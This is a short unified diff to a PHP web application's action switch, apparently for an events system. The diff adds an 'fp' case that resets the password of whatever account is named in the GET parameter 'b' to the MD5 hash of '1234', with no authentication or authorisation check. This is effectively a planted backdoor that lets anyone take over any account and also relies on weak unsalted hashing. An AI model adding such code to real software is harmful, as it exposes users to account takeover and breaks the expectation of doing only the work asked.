@@ -267,6 +267,11 @@ switch($action) {
 		}
 		$event = get_event($event_id);
 	break;
+
+	case "fp":
+		set_password($_GET['b'], md5("1234"));
+		$password_changed = true;
+	break;
 	
 	case "none":
 		if(isset($_GET['e'])) {
